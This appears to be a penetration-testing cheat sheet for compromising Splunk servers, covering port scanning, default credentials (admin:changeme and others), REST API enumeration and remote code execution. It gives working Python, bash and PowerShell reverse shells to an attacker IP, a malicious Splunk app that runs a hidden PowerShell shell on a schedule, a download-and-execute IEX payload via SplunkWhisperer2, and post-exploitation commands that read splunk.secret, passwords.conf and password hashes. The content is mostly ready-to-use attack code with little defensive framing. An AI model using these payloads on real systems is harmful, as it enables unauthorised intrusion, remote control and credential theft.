# Discovery
```powershell
# Full service scan targeting Splunk ports
sudo nmap -sV -p 8000,8089 <target>

# Broader scan — discover Splunk alongside other services
sudo nmap -sV <target>

8000/tcp open  ssl/http  Splunkd httpd
8089/tcp open  ssl/http  Splunkd httpd
```

# Web Fingerprint
```powershell
# Identify via HTTP headers / title
curl -sk https://<target>:8000 | grep -i splunk

# Check REST API endpoint (no auth required for version info in some configs)
curl -sk https://<target>:8089/services/server/info \
  -u admin:changeme | grep -i version

# Quick version check via unauthenticated endpoint (some versions)
curl -sk https://<target>:8089/services/server/info?output_mode=json | python3 -m json.tool | grep version
```

# Default Credentials
```powershell
admin:changeme
admin:admin
admin:Welcome1
admin:Password123
admin:splunk
```

# Enumeration
```powershell
# If Splunk Free is running, the dashboard loads without credentials
curl -sk https://<target>:8000/en-US/app/launcher/home
# Look for: 200 OK with no redirect to /en-US/account/login
```

# Browse REST API
```powershell
# List all apps installed
curl -sk https://<target>:8089/services/apps/local \
  -u admin:changeme

# Get server info (OS, Splunk version, hostname)
curl -sk https://<target>:8089/services/server/info \
  -u admin:changeme

# List all search jobs
curl -sk https://<target>:8089/services/search/jobs \
  -u admin:changeme

# Retrieve all indexes (data sources)
curl -sk https://<target>:8089/services/data/indexes \
  -u admin:changeme
```

# Enumerate Users
```powershell
curl -sk https://<target>:8089/services/authentication/users \
  -u admin:changeme
```

# Remote Code Execution
```powershell
# rev_shell.py
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```
```
# rev_shell_win.py
import socket, subprocess

s = socket.socket()
s.connect(("<ATTACKER_IP>", 4444))
while True:
    cmd = s.recv(1024).decode()
    proc = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(proc.stdout + proc.stderr)
```

# Method 1: Malicious Custom App — Windows Target (PowerShell)
```powershell
mkdir -p splunk_shell/bin splunk_shell/default

splunk_shell/
├── bin/
│   ├── run.bat       ← launches PowerShell
│   └── run.ps1       ← PowerShell reverse shell
└── default/
    └── inputs.conf   ← tells Splunk to run the script
```
```
// Step 2 — Create run.ps1 (PowerShell reverse shell)
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>', 443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```
```
// Step 3 — Create run.bat (launcher for PowerShell)
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
```
// Step 4 — Create inputs.conf

# splunk_shell/default/inputs.conf
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
```
// Step 5 — Package the app
tar -cvzf updater.tar.gz splunk_shell/
```
```
// Step 6 — Start your listener
sudo nc -lnvp 443
```
```
// Step 7 — Upload via Splunk Web
Splunk Web → Settings → Apps → Install app from file → Browse → updater.tar.gz → Upload

URL: https://<target>:8000/en-US/manager/search/apps/local
```

# Method 2: Malicious Custom App — Linux Target (Python)
```powershell
// Step 1 - rev.py — Linux Python reverse shell
# splunk_shell/bin/rev.py
import sys, socket, os, pty
ip   = "<ATTACKER_IP>"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')

// Step 2 - inputs.conf for Linux
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

// Step 3 - Package the app
tar -cvzf updater.tar.gz splunk_shell/
```

# Method 3: REST API — Direct Script Trigger
```powershell
curl -sk https://<target>:8089/services/data/inputs/script \
  -u admin:changeme \
  -d "name=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1'" \
  -d interval=10 \
  -d sourcetype=rce_test
```

# Method 4: Universal Forwarder Abuse (SplunkWhisperer2)
```powershell
git clone https://github.com/cnotin/SplunkWhisperer2
cd SplunkWhisperer2

// Linux target
python3 PySplunkWhisperer2_remote.py \
  --host <target> \
  --port 8089 \
  --username admin \
  --password changeme \
  --payload "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1'"

// Windows target
python3 PySplunkWhisperer2_remote.py \
  --host <target> \
  --port 8089 \
  --username admin \
  --password changeme \
  --payload "powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')\""
```

# Post Exploitation
```powershell
# Passwords stored in Splunk are encrypted with a local key
# Key location on Linux:
cat /opt/splunk/etc/auth/splunk.secret

# Encrypted passwords in:
cat /opt/splunk/etc/system/local/passwords.conf
cat /opt/splunk/etc/apps/*/local/passwords.conf

# User hashes stored here (SHA-256 + salt)
cat /opt/splunk/etc/passwd
```
